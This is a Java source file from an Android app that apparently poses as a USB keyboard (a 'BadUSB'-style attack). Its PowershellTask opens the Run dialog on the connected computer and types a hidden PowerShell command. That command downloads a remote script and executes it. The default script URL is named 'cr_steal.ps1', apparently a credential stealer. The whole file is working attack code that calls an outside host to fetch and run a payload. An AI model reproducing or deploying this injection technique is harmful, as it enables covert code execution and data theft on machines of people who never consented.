package cf.netdex.hidfuzzer.task;

import android.content.Context;

import cf.netdex.hidfuzzer.hid.HIDR;
import cf.netdex.hidfuzzer.hid.Input;
import eu.chainfire.libsuperuser.Shell;

import static cf.netdex.hidfuzzer.hid.Input.KB;

/**
 * Created by netdex on 1/17/2017.
 */

public class PowershellTask extends HIDTask {
    public PowershellTask(Context context) {
        super(context);
    }

    @Override
    public void run() {
        Shell.Interactive sh = this.getSU();
        if (sh == null) return;

        final HIDR h = this.getHIDR();

        say("Run PowerShell script.");
        String file = ask("PowerShell script?", "https://netdex.cf/s/cr_steal/cr_steal.ps1");

        while (!isCancelled()) {
            publishProgress(RunState.IDLE);
            // poll until /dev/hidg0 is writable
            while (!isCancelled() && h.test() != 0) {
                h.delay(1000);
            }
            if (isCancelled()) break;
            publishProgress(RunState.RUNNING);

            h.delay(1000);
            h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
            h.delay(2000);
            h.send_string("powershell -WindowStyle Hidden iex ((new-object net.webclient).downloadstring('" + file + "'))\n");
            publishProgress(RunState.DONE);
            while (!isCancelled() && h.test() == 0) {
                h.delay(1000);
            }
            toast("Disconnected");
        }
    }
}
